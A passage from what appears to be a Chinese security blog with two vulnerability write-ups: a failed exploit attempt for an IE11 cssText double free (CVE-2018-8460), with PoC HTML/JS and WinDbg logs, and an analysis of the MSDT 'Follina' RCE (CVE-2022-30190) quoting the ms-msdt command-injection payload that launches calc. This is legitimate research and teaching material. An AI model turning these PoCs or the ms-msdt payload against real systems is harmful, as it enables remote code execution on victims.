elm.className = 'AAAAAAAAA'

}
&lt;/script&gt;

&lt;body onload='testcase();'&gt;
&lt;/html&gt;
</code></pre></div></div>

<p>然而该POC的利用难度更大，虽然不用reload即可造成崩溃，但是调试后发现崩溃原因是因为每次设置cssText后都会触发EventListener使得继续设置cssText，嵌套调用多次后导致释放原来的cssText出错，造成了内存损坏：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:007&gt; r
eax=00000000 ebx=00000000 ecx=77342c0e edx=03944201 esi=00380000 edi=07d408f8
eip=7739e975 esp=03944454 ebp=039444cc iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
ntdll!RtlReportCriticalFailure+0x29:
7739e975 cc              int     3
0:007&gt; kb
 # ChildEBP RetAddr  Args to Child              
00 039444cc 7739f8a9 c0000374 773d4270 03944510 ntdll!RtlReportCriticalFailure+0x29
01 039444dc 7739f989 00000002 7d9ede58 00000000 ntdll!RtlpReportHeapFailure+0x21
02 03944510 7734d95c 00000008 00380000 07d408f8 ntdll!RtlpLogHeapFailure+0xa1
03 03944540 764914ad 00380000 00000000 07d40900 ntdll!RtlFreeHeap+0x64
04 03944554 6da925cc 00380000 00000000 07d40900 kernel32!HeapFree+0x14
05 03944570 6d1acfd6 07d40900 6d221ae9 00000000 MSHTML!MemoryProtection::HeapFree+0x46
06 03944578 6d221ae9 00000000 800113eb 1f9d2224 MSHTML!ProcessHeapFree+0x10
07 039445a0 6d425d0a 033e7680 00000000 033e7a40 MSHTML!CAttrArray::Free+0x102
08 03944714 6d607f06 6d2a4e1c 1f9d2224 07d5855c MSHTML!PROPERTYDESC::HandleStyleComponentProperty+0x8ac
09 03944778 6d607df1 07d5855c 033e7a40 039447c4 MSHTML!BASICPROPPARAMS::SetStyleComponentProperty+0xfe
0a 039447a4 6d607d82 6d2a4e1c 039447c4 000d2200 MSHTML!CBase::put_StyleComponentHelper+0x3a
0b 039447c8 6d8d2aac 033e7a40 07d5855c 6d2a4e1c MSHTML!CCSSStyleDeclaration::put_StyleComponentLocalHelper+0x7a
0c 039447e8 6d8d2a76 033e7a40 07d5855c 03944890 MSHTML!CWritableCSSStyleDeclaration::put_cssText+0x28
0d 03944810 706d302a 041f7b10 02000002 041eaa80 MSHTML!CFastDOM::CCSSStyleDeclaration::Trampoline_Set_cssText+0x7f
0e 03944880 706d3a73 041f7b10 02000002 041eaa80 jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x19d
0f 039448a8 70840b88 d6d1a38e 03944b60 041dd360 jscript9!&lt;lambda_73b9149c3f1de98aaab9368b6ff2ae9d&gt;::operator()+0xa1
10 03944920 02d90125 034d3028 041eaa80 000003b7 jscript9!Js::JavascriptOperators::PatchPutValueNoLocalFastPath&lt;Js::InlineCache&gt;+0x352
</code></pre></div></div>

<p>内存释放的动作不可控，无法在释放内存前添加对象占用内存，因此仍使用原POC进行利用。</p>

<h2 id="利用尝试">利用尝试</h2>

<h3 id="尝试一手动释放csstext">尝试一：手动释放cssText</h3>

<p>在查看CVE-2020-17053时，可以通过Worker对象释放ArrayBuffer，随后通过新建数组对象填充被释放的内存实现UAF：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var ab = new ArrayBuffer(0x8c);
var obj = {};
obj.valueOf = function () {
    if (flag == 1) {
		//alert("free");
        worker = new Worker('worker.js');
        worker.postMessage(ab, [ab]);
        worker.terminate();
        worker = null;
        var start = Date.now();
        while (Date.now() - start &lt; 200) {}
        for(var i=0;i&lt;0x1000;++i)
		{
			R1[i] = new Array((0x1000-0x20)/4);
			for(var j=0;j&lt;R1[i].length;++j)
			{
				R1[i][j] = 0x666;   //flag
			}
		}
		// TODO: reclaim freed memory
		return 0;
    }
</code></pre></div></div>

<p>于是打算在利用Worker对象释放cssText随后占用，修改EXP如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;html&gt;
&lt;head&gt;
        &lt;meta http-equiv="Expires" content="-1"&gt;
&lt;head&gt;
&lt;script&gt;
	
var iterationCount = 0;
	
function testcase() {
Math.atan2(1,0);
elm = document.createElement('ins')
func = function(e) {
        iterationCount++;
        switch (iterationCount) {
                case 1:
                case 2:
                case 12:
                case 22:
                /*case 34:*/
                        this.style.cssText = '-ms-layout-grid: char strict auto auto; -ms-layout-grid: none fixed 49cp auto;';
                        break;
        }
}
elm.addEventListener('DOMAttrModified', func, true)
elm.className = 'AAAAAAAAA'

elm.removeEventListener('DOMAttrModified', func, true);
worker = new Worker('worker.js');
worker.postMessage(elm.style.cssText);
worker.terminate();
var arr = new ArrayBuffer(0x22);

}
&lt;/script&gt;

&lt;body onload='testcase();'&gt;
&lt;/html&gt;
</code></pre></div></div>

<p>然而在调试时发现<code class="language-plaintext highlighter-rouge">worker.terminate();</code>执行后，cssText字符串并没有被释放，也就无法占用内存利用：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:007&gt; g
Breakpoint 0 hit
eax=00000002 ebx=04de1a50 ecx=6a854520 edx=040ab4d0 esi=00000002 edi=040ab540
eip=6e1b3027 esp=040ab4c8 ebp=040ab530 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x19a:
6e1b3027 ff55e8          call    dword ptr [ebp-18h]  ss:002b:040ab518={MSHTML!CFastDOM::CWorker::Trampoline_postMessage (6a854520)}
0:007&gt; g
Breakpoint 0 hit
eax=00000001 ebx=04de1a80 ecx=6b07b4c0 edx=040ab4d8 esi=00000001 edi=040ab548
eip=6e1b3027 esp=040ab4d0 ebp=040ab538 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x19a:
6e1b3027 ff55e8          call    dword ptr [ebp-18h]  ss:002b:040ab520={MSHTML!CFastDOM::CWorker::Trampoline_terminate (6b07b4c0)}
0:007&gt; dd 03adb930 La*4
03adb930  04091400 6a3b9068 00000002 0000000f
03adb940  0409140a 6a3b9068 00000001 0000000f
03adb950  04091400 6a3b9140 00000002 0000000f
03adb960  0409140a 6a3b9140 00000001 0000000f
03adb970  04090300 6a3a5b4c 00000001 6b3fd8e4
03adb980  04090300 6a3a5c58 00000002 03080c04
03adb990  808c1f0a 8001140b 043cc748 00000006
03adb9a0  808c1f0a 8001140b 043cc7f0 6b3fd988
03adb9b0  84081f0a 8001140b 043cc780 043cc7aa
03adb9c0  84081f0a 8001140b 043cc780 043cc7aa
0:007&gt; g
Breakpoint 0 hit
eax=00000002 ebx=04db3360 ecx=6b062d40 edx=040ab4d0 esi=00000002 edi=040ab540
eip=6e1b3027 esp=040ab4c8 ebp=040ab530 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x19a:
6e1b3027 ff55e8          call    dword ptr [ebp-18h]  ss:002b:040ab518={MSHTML!CFastDOM::CWindow::Trampoline_alert (6b062d40)}
0:007&gt; dd 03adb930 La*4
03adb930  04091400 6a3b9068 00000002 0000000f
03adb940  0409140a 6a3b9068 00000001 0000000f
03adb950  04091400 6a3b9140 00000002 0000000f
03adb960  0409140a 6a3b9140 00000001 0000000f
03adb970  04090300 6a3a5b4c 00000001 6b3fd8e4
03adb980  04090300 6a3a5c58 00000002 03080c04
03adb990  808c1f0a 8001140b 043cc748 00000006
03adb9a0  808c1f0a 8001140b 043cc7f0 6b3fd988
03adb9b0  84081f0a 8001140b 043cc780 043cc7aa
03adb9c0  84081f0a 8001140b 043cc780 043cc7aa
0:007&gt; du 043cc780 
043cc780  "char strict auto auto"
0:007&gt; du 043cc748 
043cc748  "none fixed 49cp auto"
</code></pre></div></div>

<h3 id="尝试二设置csstext清空内存">尝试二：设置cssText清空内存</h3>

<p>在分析漏洞原理时得知，每次设置新的cssText内容时，会先清除原本的字符串后再赋值新的字符串，因此利用该特性清除原本的字符串时应该也会产生崩溃。于是修改POC执行<code class="language-plaintext highlighter-rouge">elm.style.cssText = '';</code>，结果验证猜想，确实会产生崩溃：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:007&gt; g
Breakpoint 0 hit
eax=00000004 ebx=0343a600 ecx=6a7145f0 edx=036ab500 esi=00000004 edi=036ab578
eip=6e1b3027 esp=036ab4f8 ebp=036ab568 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x19a:
6e1b3027 ff55e8          call    dword ptr [ebp-18h]  ss:002b:036ab550={MSHTML!CFastDOM::CNode::Trampoline_removeEventListener (6a7145f0)}
0:007&gt; g
Breakpoint 0 hit
eax=00000001 ebx=03436990 ecx=6a3df860 edx=036ab308 esi=00000001 edi=036ab374
eip=6e1b3027 esp=036ab300 ebp=036ab364 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x19a:
6e1b3027 ff55e8          call    dword ptr [ebp-18h]  ss:002b:036ab34c={MSHTML!CFastDOM::CHTMLElement::Trampoline_Get_style (6a3df860)}
0:007&gt; g
Breakpoint 0 hit
eax=00000002 ebx=03448b10 ecx=6a535d30 edx=036ab3f8 esi=00000002 edi=036ab46c
eip=6e1b3027 esp=036ab3f0 ebp=036ab45c iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x19a:
6e1b3027 ff55e8          call    dword ptr [ebp-18h]  ss:002b:036ab444={MSHTML!CFastDOM::CCSSStyleDeclaration::Trampoline_Set_cssText (6a535d30)}
0:007&gt; g						//重新设置cssText后由于释放了原本的cssText造成了doublefree
Critical error detected c0000374
(a4c.32c): Break instruction exception - code 80000003 (first chance)
eax=00000000 ebx=00000000 ecx=77342c0e edx=036aadd9 esi=005f0000 edi=036b8768
eip=7739e975 esp=036ab02c ebp=036ab0a4 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
ntdll!RtlReportCriticalFailure+0x29:
7739e975 cc              int     3
</code></pre></div></div>

<p>接着打算利用addEventListener添加新的监听，使得在清除cssText时能够执行回调函数创建ArrayBuffer占用被释放的内存：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;html&gt;
&lt;head&gt;
        &lt;meta http-equiv="Expires" content="-1"&gt;
&lt;head&gt;
&lt;script&gt;
	
var iterationCount = 0;
var R1 = new Array();	
function testcase() {
Math.atan2(1,0);
elm = document.createElement('ins')
func = function(e) {
        iterationCount++;
        switch (iterationCount) {
                case 1:
                case 2:
                case 12:
                case 22:
                /*case 34:*/
                        this.style.cssText = '-ms-layout-grid: char strict auto auto; -ms-layout-grid: none fixed 49cp auto;';
                        break;
        }
}
funcA = function(a) {
        for(var i=0;i&lt;0x100;++i)
		{
			R1[i] = new ArrayBuffer(0x2c);
		}

}
elm.addEventListener('DOMAttrModified', func, true)
elm.className = 'AAAAAAAAA'
elm.addEventListener('DOMAttrModified', funcA, true)
elm.style.cssText = '';				//执行该语句会清空cssText，导致崩溃
var view = new DataView(R1[0]);
alert(view.byteLength);
}
&lt;/script&gt;

&lt;body onload='testcase();'&gt;
&lt;/html&gt;
</code></pre></div></div>

<p>然而调试后发现回调触发是在清空cssText之后，因此无法通过该种方式填充被释放的内存。</p>

<h3 id="尝试三利用worker新建线程进行占位">尝试三：利用worker新建线程进行占位</h3>

<p>在查阅worker新建线程时查看到<a href="https://exploiting.files.wordpress.com/2012/10/html5-heap-spray.pdf">html5-heap-spray</a>这篇文章，可以通过worker新建线程进行堆喷，这样在清除cssText时就有机会通过新线程创建的对象占位被释放的cssText实现UAF：</p>

<p>修改后的poc.html：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;html&gt;
&lt;head&gt;
        &lt;meta http-equiv="Expires" content="-1"&gt;
&lt;head&gt;
&lt;script&gt;
	
var iterationCount = 0;
function testcase() {
elm = document.createElement('ins')
func = function(e) {
        iterationCount++;
        switch (iterationCount) {
                case 1:
                case 2:
                case 12:
                case 22:
                /*case 34:*/
                        this.style.cssText = '-ms-layout-grid: char strict auto auto; -ms-layout-grid: none fixed 49cp auto;';
                        break;
        }
}

elm.addEventListener('DOMAttrModified', func, true);
alert(1);
elm.className = 'AAAAAAAAA';
elm.removeEventListener('DOMAttrModified', func, true);
var workers = new Worker('worker.js');
var arr = new Arraybuffer(0x2c);
workers.postMessage(arr);
var arrview = new DataView(arr);
elm.style.cssText = '';
}
&lt;/script&gt;

&lt;body onload='testcase();'&gt;
&lt;/html&gt;
</code></pre></div></div>

<p>worker.js:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>onmessage = function(e){
	var a = Array();
	for(var i = 0; i&lt;0x100; i++){
		a[i] = new ArrayBuffer(0x2c);
	}
	postMessage(e);
}
</code></pre></div></div>

<p>但是在调试过程中，执行到新建线程后程序便无法断下了，猜测没有创建正确的worker.js导致无法继续利用，利用尝试失败。</p>

<p>于是验证IE11是否能正确使用web worker对象，编写的web worker代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>test.html:
&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
	&lt;title&gt;Web Worker&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
	&lt;p&gt;Web Worker is Counting Numbers&lt;/p&gt;

	&lt;p&gt;Counting: &lt;output id="countM"&gt;&lt;/output&gt;&lt;/p&gt;

	&lt;button onclick="alertMessage()"&gt;
		Alert On
	&lt;/button&gt;

	&lt;script&gt;
	
		// This is function to run alert
		function alertMessage() {
			alert("Web Worker is Running in Background");
		}

		// Created a web worker and passed script which
		// needs to execute in background
		var worker = new Worker("worker.js");

		// Called onmessage method to get value from
		// script file and show it on web page
		worker.onmessage = function (event) {
			document.getElementById("countM")
				.innerHTML = event.data;
		};
	&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
//------------------------------------------------------------

worker.js:
// Initialized a variable with 0
var count = 0;

function timedCount() {
count = count + 1;
	
// It is used to send value
// back to html page
postMessage(count);
	
// It is a timeout function
setTimeout("timedCount()",1000);
}

timedCount();
</code></pre></div></div>

<p>使用同样的代码在Chrome和Edge中均能正常执行：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/image-20220630113303316.png" alt="image-20220630113303316" /></p>

<p>然而在IE11中，web worker却无法正常执行，Counting没有正确显示：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/image-20220630113426845.png" alt="image-20220630113426845" /></p>

<p>可能由于IE11对于web worker的支持并不是很多，导致该种利用方式无法成功执行。</p>

<h1 id="总结">总结</h1>

<p>漏洞是因为cssText被递归设置导致内部字符串损坏，出现了两个指向同一个字符串的cssText，当再次重置cssText时，由于同一个字符串被释放两次造成了漏洞。利用思路可以通过新建线程在释放cssText时创建对象占用被释放的字符串内存，实现从doublefree到UAF。</p>

<p>然而在实际利用过程中，对于IE多线程并不熟悉，web worker在IE11并不能正确执行，如果有其他方式能够创建多线程占位内存的话则能够利用该漏洞。</p>]]></content><author><name>Joey</name></author><category term="漏洞利用" /><summary type="html"><![CDATA[前言 分析该漏洞的原因是看到ZDI的这篇分析文章：CVE-2018-8460: EXPOSING A DOUBLE FREE IN INTERNET EXPLORER FOR CODE EXECUTION。里面详细分析了该漏洞的原理和利用思路，但是没有EXP，因此想尝试自己写出EXP。虽然最终没有成功写出EXP，但还是把学习的过程记录了下来，作为一个积累。]]></summary></entry><entry><title type="html">微软MSDT远程代码执行漏洞 CVE-2022-30190 分析</title><link href="http://localhost:4000/2022-06-10/CVE-2022-30190" rel="alternate" type="text/html" title="微软MSDT远程代码执行漏洞 CVE-2022-30190 分析" /><published>2022-06-10T00:00:00+08:00</published><updated>2022-06-10T00:00:00+08:00</updated><id>http://localhost:4000/2022-06-10/CVE-2022-30190</id><content type="html" xml:base="http://localhost:4000/2022-06-10/CVE-2022-30190"><![CDATA[<h1 id="前言">前言</h1>

<p>在分析漏洞的过程中，陆陆续续看到许多师傅的分析文章，于是参考之后结合自己的分析总结了一下。<!--more--></p>

<h1 id="漏洞简介">漏洞简介</h1>

<p>近日，微软官方网站发布了Microsoft Office MSDT（Microsoft Support Diagnostic Tool）远程代码执行漏洞通告，漏洞编号CVE-2022-30190，目前在开源代码平台已存在该漏洞的验证代码。该通告指出，<strong>Microsoft Office MSDT存在远程代码执行漏洞，攻击者可利用Office文件中的远程模板功能，访问远程服务器上挂载的恶意HTML文件，之后通过 ‘ms-msdt’ URI来执行恶意PowerShell代码</strong>。</p>

<p>值得注意的是该漏洞在宏被禁用的情况下仍可被利用。<strong>并且当恶意文件另存为RTF格式时，还可以通过Windows资源管理器中的预览窗格触发此漏洞的调用，无需执行也可以在目标机器上执行任意代码。</strong>该漏洞影响范围非常广泛，目前官方未发布修复补丁。</p>

<h1 id="漏洞利用链">漏洞利用链</h1>

<h2 id="样本执行流程">样本执行流程</h2>

<p><strong>1. 攻击者利用Office文件中的远程模板功能加载远程的poc.html</strong></p>

<p>在document.xml.rels文件中可以看到docx文件嵌入了一个ole对象，指向了poc.html</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-06_11-45-45.png" alt="Snipaste_2022-06-06_11-45-45" /></p>

<hr />

<p><strong>2.poc.html通过 ‘ms-msdt’ URL使得Office执行msdt.exe，并将构造好的命令行参数传入msdt.exe</strong></p>

<p>查看poc.html的内容，可以看到页面访问了URL：</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_SelectProgram=NotListed IT_BrowseForFile=h$(IEX('calc.exe'))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe \"
</code></pre></div></div>
<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-06_11-56-48.png" alt="Snipaste_2022-06-06_11-56-48" /></p>

<p>上述注释是为了填充HTML页面使其大小大于4kb，只有大于4kb的HTML页面word才会解析该页面进而触发漏洞，具体原因在<a href="https://billdemirkapi.me/unpacking-cve-2021-40444-microsoft-office-rce/">Unpacking CVE-2021-40444: A Deep Technical Analysis of an Office RCE Exploit</a>这篇文章中已经分析的很清楚了。</p>

<p>使用urlprotocolview查看<strong>ms-msdt</strong> URL对应的二进制文件正是msdt.exe</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-06_11-40-32.png" alt="Snipaste_2022-06-06_11-40-32" /></p>

<p>winword.exe解析该URL后会调用msdt.exe，并将命令行参数传入</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-06_12-44-35.png" alt="Snipaste_2022-06-06_12-44-35" /></p>

<hr />

<p><strong>3.msdt.exe接收命令行参数后触发漏洞执行powershell命令：<code class="language-plaintext highlighter-rouge">IEX('calc.exe')</code>，调用了calc.exe</strong></p>

<p>因为直接打开msdt.exe需要输入技术支持人员密钥才能进行下一步诊断，通过参数<code class="language-plaintext highlighter-rouge">/id PCWDiagnostic</code>运行PCWDiagnostic程序兼容性诊断包绕过了该步骤</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-06_13-26-12.png" alt="Snipaste_2022-06-06_13-26-12" /></p>

<p>然而只是绕过输入密钥还不够，还需要点击下一页，才可以接收参数执行进程，通过参数<code class="language-plaintext highlighter-rouge">/skip force </code>绕过了该步骤，此时msdt会创建并启动服务，通过svchost.exe创建进程sdiagnhost.exe</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_11-08-59.png" alt="Snipaste_2022-06-08_11-08-59" /></p>

<p>接着再输入</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/param "IT_RebrowseForFile=cal?c IT_SelectProgram=NotListed IT_BrowseForFile=h$(IEX('calc.exe'))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe"
</code></pre></div></div>
<p>就能通过sdiagnhost.exe执行powershell命令，整个漏洞利用完成。</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_09-52-02.png" alt="Snipaste_2022-06-08_09-52-02" /></p>

<p>整个漏洞利用链如图所示：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/image-20220815170312333.png" alt="image-20220815170312333" /></p>

<h2 id="漏洞利用细节">漏洞利用细节</h2>

<h3 id="word解析url">word解析URL</h3>

<p>word在解析ms-msdt Office URL时是通过mshtml.dll的ShellExecURL函数解析的，而该函数内部会调用ShellExecuteW执行命令行参数创建msdt.exe</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; r
rax=0000000000000000 rbx=0000000000000000 rcx=0000000000000000
rdx=0000000000000000 rsi=0000000080004005 rdi=00000267dfbe07f0
rip=00007ffa2fe2fe45 rsp=000000f644b0d410 rbp=000000f644b0d510
 r8=00000267dfb84838  r9=0000000000000000 r10=0000000000000000
r11=0000000000000246 r12=00007ffa3086e358 r13=0000000000000000
r14=0000000000000000 r15=0000000000000020
iopl=0         nv up ei pl zr na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
mshtml!ShellExecURL+0x24d:
00007ffa`2fe2fe45 48ff1554b8c600  call    qword ptr [mshtml!_imp_ShellExecuteW (00007ffa`30a9b6a0)] ds:00007ffa`30a9b6a0={mshtml!_imp_load_ShellExecuteW (00007ffa`2f8edaaa)}
0:000&gt; du r8		//ShellExecuteW的执行参数
00000267`dfb84838  "ms-msdt:/id PCWDiagnostic /skip "
00000267`dfb84878  "force /param "IT_RebrowseForFile"
00000267`dfb848b8  "=cal?c IT_SelectProgram=NotListe"
00000267`dfb848f8  "d IT_BrowseForFile=h$(IEX('calc."
00000267`dfb84938  "exe'))i/../../../../../../../../"
00000267`dfb84978  "../../../../../../Windows/System"
00000267`dfb849b8  "32/mpsigstub.exe ""
0:000&gt; k			//函数调用栈
 # Child-SP          RetAddr           Call Site
00 00000092`064fccc8 00007ffa`707502de SHELL32!ShellExecuteNormal
01 00000092`064fccd0 00007ffa`707d8f11 SHELL32!ShellExecuteExW+0xde
02 00000092`064fce70 00007ffa`2fe2fe4c SHELL32!ShellExecuteW+0x81
03 00000092`064fcf30 00007ffa`2fe2ee3a mshtml!ShellExecURL+0x254
04 00000092`064fd1f0 00007ffa`2fb4e721 mshtml!OpenInNewWindow+0x38e
05 00000092`064fd3e0 00007ffa`2f6206cf mshtml!CDoc::DoNavigate_NavigateInNewBrowser+0x201
06 00000092`064fd470 00007ffa`2f619f00 mshtml!CDoc::DoNavigate+0xbaf
07 00000092`064fd7c0 00007ffa`2f751420 mshtml!CDoc::FollowHyperlink2+0xc70
08 00000092`064fd9c0 00007ffa`2f75072b mshtml!CWindow::FollowHyperlinkHelper+0x2a4
09 00000092`064fdb40 00007ffa`2f74a704 mshtml!CWindow::NavigateEx+0xeb
0a 00000092`064fdcb0 000001c0`4fad4802 mshtml!COmLocationProxy::InvokeEx+0x4f4
0b 00000092`064fddc0 000001c0`4fad468e jscript9!HostDispatch::CallInvokeExInternal+0xf2
0c 00000092`064fde60 000001c0`4fad4540 jscript9!HostDispatch::CallInvokeHandler+0x96
0d 00000092`064fdee0 000001c0`4fb8afb6 jscript9!HostDispatch::CallInvokeEx+0x90
0e 00000092`064fdf70 000001c0`4fb8aed3 jscript9!HostDispatch::PutValueByDispId+0xd6
0f 00000092`064fe030 000001c0`4fa50ce1 jscript9!HostDispatch::PutValue+0x37
10 00000092`064fe070 000001c0`4fa54a1e jscript9!Js::JavascriptOperators::OP_SetProperty+0x1d1
11 00000092`064fe100 000001c0`4fa43f43 jscript9!Js::JavascriptOperators::PatchPutValueNoFastPath+0x7e
12 00000092`064fe180 000001c0`4fa47a2d jscript9!Js::InterpreterStackFrame::DoProfiledSetProperty&lt;Js::OpLayoutElementCP_OneByte const &gt;+0x183
13 00000092`064fe240 000001c0`4fa45029 jscript9!Js::InterpreterStackFrame::Process+0x6cd
14 00000092`064fe2c0 000001c0`4ff00fc3 jscript9!Js::InterpreterStackFrame::InterpreterThunk&lt;1&gt;+0x4c9
15 00000092`064fe4d0 000001c0`4fb0afb6 0x000001c0`4ff00fc3
16 00000092`064fe500 000001c0`4f9eb3d1 jscript9!amd64_CallFunction+0x86
17 00000092`064fe550 000001c0`4fa9abc9 jscript9!Js::JavascriptFunction::CallFunction&lt;1&gt;+0x71
18 00000092`064fe5c0 000001c0`4fa9aab0 jscript9!Js::JavascriptFunction::CallRootFunctionInternal+0xfd
19 00000092`064fe690 000001c0`4fa9aa0b jscript9!Js::JavascriptFunction::CallRootFunction+0x64
1a 00000092`064fe700 000001c0`4fa9a929 jscript9!ScriptSite::CallRootFunction+0x67
1b 00000092`064fe760 000001c0`4fa9ae80 jscript9!ScriptSite::Execute+0x109
1c 00000092`064fe7f0 000001c0`4fa20430 jscript9!ScriptEngine::ExecutePendingScripts+0x234
1d 00000092`064fe8e0 000001c0`4faf6924 jscript9!ScriptEngine::ParseScriptTextCore+0x49c
1e 00000092`064fea40 00007ffa`2f81e0c8 jscript9!ScriptEngine::ParseScriptText+0xc4
1f 00000092`064feaf0 00007ffa`2f5a25aa mshtml!CActiveScriptHolder::ParseScriptText+0xb8
20 00000092`064feb70 00007ffa`2f5a0f92 mshtml!CScriptCollection::ParseScriptText+0x25a
21 00000092`064fec50 00007ffa`2f5a09b6 mshtml!CScriptData::CommitCode+0x422
22 00000092`064fee20 00007ffa`2f5a072f mshtml!CScriptData::Execute+0x266
23 00000092`064feed0 00007ffa`2f63fa05 mshtml!CHtmScriptParseCtx::Execute+0xbf
24 00000092`064fef00 00007ffa`2f540767 mshtml!CHtmParseBase::Execute+0x95
25 00000092`064fef90 00007ffa`2f53ffaa mshtml!CHtmPost::Broadcast+0x47
26 00000092`064fefd0 00007ffa`2f80db06 mshtml!CHtmPost::Exec+0x29a
27 00000092`064ff1d0 00007ffa`2f80d9db mshtml!CHtmPost::Run+0x32
28 00000092`064ff200 00007ffa`2f80d96f mshtml!PostManExecute+0x63
29 00000092`064ff240 00007ffa`2f80d4d0 mshtml!PostManResume+0xab
2a 00000092`064ff280 00007ffa`2f875eec mshtml!CHtmPost::OnDwnChanCallback+0x40
2b 00000092`064ff2d0 00007ffa`2f53b0c1 mshtml!CDwnChan::OnMethodCall+0x1c
2c 00000092`064ff300 00007ffa`2f5dca04 mshtml!GlobalWndOnMethodCall+0x2b1
2d 00000092`064ff3b0 00007ffa`2f9854b8 mshtml!GlobalWndProc_SEH+0x104
2e 00000092`064ff440 00007ffa`6fd1e858 mshtml!GlobalWndProc+0x3a8c08
2f 00000092`064ff480 00007ffa`6fd1e299 USER32!UserCallWinProcCheckWow+0x2f8
30 00000092`064ff610 00007ffa`3e081af9 USER32!DispatchMessageWorker+0x249
31 00000092`064ff690 00007ffa`3dfe2009 wwlib!PTLS7::LsNotReached+0x7bd49
32 00000092`064ff730 00007ff6`79e71230 wwlib!FMain+0x61
33 00000092`064ff760 00007ff6`79e71519 winword+0x1230
34 00000092`064ff790 00007ffa`71177034 winword+0x1519
35 00000092`064ff7d0 00007ffa`71362651 KERNEL32!BaseThreadInitThunk+0x14
36 00000092`064ff800 00000000`00000000 ntdll!RtlUserThreadStart+0x21
</code></pre></div></div>

<p>ShellExecuteW内部则是通过CreateRemoteThreadEx创建新线程，通过新线程创建msdt.exe：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:027&gt; r
rax=0000000002000000 rbx=0000000000000000 rcx=000000e48ad4d438
rdx=000000e48ad4d4a0 rsi=0000021054c22ee0 rdi=0000000000000000
rip=00007ffada60e620 rsp=000000e48ad4d358 rbp=000000e48ad4eb00
 r8=0000000002000000  r9=0000000002000000 r10=0000000000000000
r11=000000e48ad4d300 r12=0000000000000001 r13=0000000000000002
r14=0000000000000008 r15=0000000000000000
iopl=0         nv up ei pl zr na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
ntdll!NtCreateUserProcess:
00007ffa`da60e620 4c8bd1          mov     r10,rcx
0:027&gt; dps poi(esp+98) La8/8			//AttributeList
000000e4`8ad4df00  00000000`000000a8
000000e4`8ad4df08  00000000`00020005	//PS_ATTRIBUTE_IMAGE_NAME
000000e4`8ad4df10  00000000`00000040	//NtImagePath.Length
000000e4`8ad4df18  00000210`54bae7b0	//NtImagePath.Buffer
000000e4`8ad4df20  00000000`00000000
000000e4`8ad4df28  00000000`00010003
000000e4`8ad4df30  00000000`00000010
000000e4`8ad4df38  000000e4`8ad4d7c0
000000e4`8ad4df40  00000000`00000000
000000e4`8ad4df48  00000000`00000006
000000e4`8ad4df50  00000000`00000040
000000e4`8ad4df58  000000e4`8ad4d900
000000e4`8ad4df60  00000000`00000000
000000e4`8ad4df68  00000000`00020009
